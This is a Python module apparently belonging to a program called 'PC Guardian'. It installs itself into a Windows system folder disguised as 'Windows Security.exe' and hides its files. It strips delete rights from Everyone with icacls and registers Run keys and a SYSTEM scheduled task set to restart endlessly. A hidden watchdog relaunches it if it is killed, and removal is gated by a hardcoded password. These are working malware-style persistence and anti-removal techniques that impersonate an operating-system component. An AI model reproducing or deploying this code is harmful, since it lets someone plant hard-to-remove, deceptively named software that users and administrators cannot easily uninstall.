"""
PC Guardian — Protection (FIXED)
Real ACL + SYSTEM install + watchdog + delete guard
"""

import os
import sys
import ctypes
import subprocess
import shutil
import threading
import time
import logging

logger = logging.getLogger("protection")

INSTALL_DIR    = r"C:\Windows\SystemApps\WindowsSecurity"
EXE_NAME       = "Windows Security.exe"
INSTALL_PATH   = os.path.join(INSTALL_DIR, EXE_NAME)
REG_KEY        = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
REG_VALUE      = "WindowsSecurityService"
TASK_NAME      = "WindowsSecurityHealth"
DELETE_PASSWORD = "DECDRV"


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def get_self_path() -> str:
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(sys.argv[0])


def install_to_system() -> bool:
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        src = get_self_path()

        if os.path.abspath(src).lower() != INSTALL_PATH.lower():
            shutil.copy2(src, INSTALL_PATH)

        # Hidden + System attributes
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_PATH, 0x02 | 0x04)
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR,  0x02 | 0x04)

        # Deny delete + modify to Everyone, allow SYSTEM full
        for cmd in [
            f'icacls "{INSTALL_DIR}" /inheritance:r',
            f'icacls "{INSTALL_DIR}" /grant SYSTEM:(F)',
            f'icacls "{INSTALL_DIR}" /grant Administrators:(RX)',
            f'icacls "{INSTALL_DIR}" /deny Everyone:(D,M,W)',
            f'icacls "{INSTALL_PATH}" /inheritance:r',
            f'icacls "{INSTALL_PATH}" /grant SYSTEM:(F)',
            f'icacls "{INSTALL_PATH}" /deny Everyone:(D,M,W)',
        ]:
            subprocess.run(cmd, shell=True, capture_output=True)

        logger.info(f"Installed to system: {INSTALL_PATH}")
        return True
    except Exception as e:
        logger.error(f"System install: {e}")
        return False


def install_registry() -> bool:
    try:
        import winreg
        # Try HKLM first (all users)
        for hive, name in [
            (winreg.HKEY_LOCAL_MACHINE, "HKLM"),
            (winreg.HKEY_CURRENT_USER,  "HKCU"),
        ]:
            try:
                key = winreg.OpenKey(hive, REG_KEY, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, REG_VALUE, 0, winreg.REG_SZ, f'"{INSTALL_PATH}"')
                winreg.CloseKey(key)
                logger.info(f"Registry added: {name}")
                return True
            except Exception:
                continue
        return False
    except Exception as e:
        logger.error(f"Registry: {e}")
        return False


def install_task_scheduler() -> bool:
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure><Interval>PT10S</Interval><Count>9999</Count></RestartOnFailure>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec><Command>{INSTALL_PATH}</Command></Exec>
  </Actions>
</Task>"""
    import tempfile
    xml_path = os.path.join(tempfile.gettempdir(), "pcg_task.xml")
    try:
        with open(xml_path, "w", encoding="utf-16") as f:
            f.write(xml)
        r = subprocess.run(
            f'schtasks /Create /TN "{TASK_NAME}" /XML "{xml_path}" /F',
            shell=True, capture_output=True, text=True
        )
        try: os.remove(xml_path)
        except Exception: pass
        if r.returncode == 0:
            logger.info("Task Scheduler: installed (runs as SYSTEM).")
            return True
        logger.error(f"Task Scheduler: {r.stderr}")
        return False
    except Exception as e:
        logger.error(f"Task Scheduler error: {e}")
        return False


def start_watchdog():
    """Watchdog that restarts on kill — runs as separate process."""
    code = f"""
import time, subprocess, psutil, sys, os
target = r"{INSTALL_PATH}"
pid    = {os.getpid()}

while True:
    time.sleep(5)
    alive = any(
        p.info.get("exe","").lower() == target.lower()
        for p in psutil.process_iter(["exe"])
        if p.info.get("exe")
    )
    if not alive:
        try:
            subprocess.Popen([target], creationflags=0x08000000)
        except Exception:
            pass
        break
"""
    import tempfile
    s = os.path.join(tempfile.gettempdir(), "pcg_wd2.py")
    with open(s, "w") as f:
        f.write(code)
    subprocess.Popen(
        [sys.executable, s],
        creationflags=subprocess.CREATE_NO_WINDOW,
        close_fds=True
    )
    logger.info("Watchdog started.")


def remove_protection(password: str) -> tuple:
    if password.upper() != DELETE_PASSWORD.upper():
        return False, "Wrong password. Cannot remove PC Guardian."

    errors = []

    # Remove ACL first so we can delete
    for cmd in [
        f'icacls "{INSTALL_DIR}" /remove Everyone',
        f'icacls "{INSTALL_PATH}" /remove Everyone',
        f'icacls "{INSTALL_DIR}" /grant Everyone:(F)',
    ]:
        subprocess.run(cmd, shell=True, capture_output=True)

    # Reset attributes
    try:
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_PATH, 0x80)
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR,  0x80)
    except Exception: pass

    # Remove registry
    try:
        import winreg
        for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            try:
                k = winreg.OpenKey(hive, REG_KEY, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(k, REG_VALUE)
                winreg.CloseKey(k)
            except Exception: pass
    except Exception as e:
        errors.append(f"Registry: {e}")

    # Remove task
    try:
        subprocess.run(f'schtasks /Delete /TN "{TASK_NAME}" /F', shell=True, capture_output=True)
    except Exception as e:
        errors.append(f"Task: {e}")

    # Remove files
    try:
        shutil.rmtree(INSTALL_DIR, ignore_errors=True)
    except Exception as e:
        errors.append(f"Files: {e}")

    if errors:
        return True, f"Removed (minor errors: {'; '.join(errors)})"
    return True, "PC Guardian fully removed."


def full_install():
    install_to_system()
    install_registry()
    install_task_scheduler()
    start_watchdog()
    logger.info("Full protection installed.")
